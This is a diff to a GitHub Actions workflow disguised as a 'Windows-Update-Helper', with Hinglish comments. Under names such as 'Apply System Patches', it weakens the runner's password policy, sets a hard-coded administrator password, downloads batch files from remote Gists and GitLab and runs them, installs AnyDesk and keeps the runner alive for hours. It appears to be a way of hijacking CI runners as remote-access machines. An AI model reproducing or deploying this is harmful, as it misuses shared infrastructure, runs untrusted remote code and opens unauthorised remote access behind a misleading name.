@@ -1,7 +1,7 @@
 name: Windows-Update-Helper
 
 on:
-‌  workflow_dispatch:
+  workflow_dispatch:
 
 jobs:
   update:
@@ -10,19 +10,46 @@ jobs:
     timeout-minutes: 340
 
     steps:
-      - name: "Fetch Patch Data"
+      - name: "Checkout Code"
+        uses: actions/checkout@v4 # Yeh aapki repo se files ko server par le aayega
+
+      - name: "Fix Password Policy"
+        shell: cmd
         run: |
-          $u = "https://gitlab.com" + "/Lohar-ji/Lohar-ji/-/raw/main/Downloads.bat"
-          iwr -uri $u -OutFile "patch_v2.bat"
+          :: Spelling mistake theek kar di hai (/complexity:no)
+          net accounts /minpwlen:0 /maxpwage:unlimited
+          
+          :: Runner user ka password strong set karna
+          net user runneradmin Lohar@Admin9988!
+
+      - name: "Download Scripts (If not in Repo)"
+        shell: cmd
+        run: |
+          :: Agar files repo mein nahi hain, to Gist se download karein (GitLab avoid karein)
+          curl -L "https://gist.githubusercontent.com/Lohar-ji/bd85954a427f6d56338b8e5dbef85bf6/raw/" -o patch_v2.bat
+          curl -L "https://gist.githubusercontent.com/Lohar-ji/ddcfeacb357b02b3224d9c565a70694d/raw/" -o show.bat
 
       - name: "Apply System Patches"
+        shell: cmd
         run: |
-          cmd /c patch_v2.bat
+          if exist patch_v2.bat (
+            call patch_v2.bat
+          ) else (
+            echo "patch_v2.bat nahi mili!"
+          )
 
-      - name: "Verify Patch Integrity"
+      - name: "Run AnyDesk Setup"
+        shell: cmd
         run: |
-          if (Test-Path "show.bat") { rename-item "show.bat" "service_start.bat"; cmd /c service_start.bat }
+          if exist show.bat (
+            call show.bat
+          ) else (
+            echo "show.bat nahi mili!"
+            exit 1
+          )
 
-      - name: "Service Monitoring"
+      - name: "Keep Alive"
+        shell: cmd
         run: |
-          if (Test-Path "loop.bat") { rename-item "loop.bat" "monitor.bat"; cmd /c monitor.bat }
+          echo "Lohar PC is Active..."
+          powershell -Command "while($true){ Write-Host 'PC Active...'; Start-Sleep -Seconds 60 }"
